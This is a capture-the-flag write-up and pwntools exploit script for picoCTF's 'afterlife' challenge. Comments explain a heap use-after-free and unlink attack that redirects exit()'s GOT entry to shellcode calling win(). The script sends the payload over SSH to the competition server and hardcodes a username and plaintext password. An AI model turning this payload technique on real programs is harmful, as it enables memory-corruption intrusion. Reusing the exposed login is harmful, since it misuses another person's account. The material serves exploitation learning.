#!/usr/bin/env python3

######################################## Write-Up ########################################
# Category: Binary Exploitation
# Points: 400 (solved after comp)
# Description: Just pwn this program and get a flag. It’s also found in /problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5 on the shell server. Source.
#
# First heap chall ever solved (with help of course)! :) So, the main exploit of this chall
# is the Use-After-Free (UAF) vuln. In the program, there is a "first" chunk that is stuck
# in a fast bin (FIFO manner of using freed chunks), and the program leaks a heap addr,
# suggesting you use it. Then, gets(first) is called, meaning you have the ability to
# edit the chunk's contents before it gets malloc()'s as the "seventh" chunk. The structure
# of the chunk looks like this:
# Heap addr points here -> |    Size of chunk   | So, the way we can utilize the UAF vuln
#                          |     fd pointer     | is through a technique called the
#                          |     bk pointer     | "unlink attack." When free() is called,
#                          |      user data     | the unlink macro does this: first->fd->bk = bk
#                          | Size of next chunk | and first->bk->fd = fd. Here, the program
# thinks that the pointers I put in here (in the script) are other freed chunks, but in
# reality they are memory that I am overwriting. Thus, I can perform a GOT overwrite. I
# initially wanted to just have the GOT entry of exit() point directly to the win()
# function to grab the flag, but I realized that I couldn't do it since the unlink macro
# would overwrite some instruction in win() w/ the fd pointer I placed. So, as in the
# write-ups I looked up for this chall, I created a shellcode that would call win() and
# Had the GOT entry point to that so that when the first->bk->fd = fd part is performed,
# it has not effects on the instructions (it writes below the shellcode). Once the payload
# is sent and malloc() is called, when exit() is called, it will instead call win(), thus
# giving me the dub.
#
# Flag: picoCTF{what5_Aft3r_d2d97c7b}
# Solved by: Ryan Nguyen
##########################################################################################

from pwn import *

exe = ELF("vuln")

context.binary = exe
context.log_level = 'debug'

# Addrs
exit_got = 0x804d02c
win = "0x08048966"

def conn():
	if False:
		return process([exe.path, 'aaaa']) # program needs an argument, doesn't matter
	else:
		shell = ssh(host='2019shell1.picoctf.com', user='giggsterpuku', password='7WH@L3ftc2')
		return shell.process(['vuln', 'AAAA'], cwd='/problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5')

def main():
	r = conn()
	r.recvline()
	heap = int(r.recvline())
	log.info("Heap address: {}".format(hex(heap)))
	r.recvuntil("useful...")
	shellcode = asm("push " + win + "; ret;") # making instructions for calling win; if we tried GOT overwriting exit() w/ win, the code at win would be corrupted due to the effects of the unlink attack
	r.sendline(p32(exit_got - 12) + p32(heap + 8) + shellcode) # when interpreted by malloc(), exit_got - 12 is where faux "chunk" starts -> so when u edit exit()'s GOT you overwtie it at the right address; heap + 8 is where shellcode starts
	#gdb.attach(r)
	r.interactive()


if __name__ == "__main__":
	main()
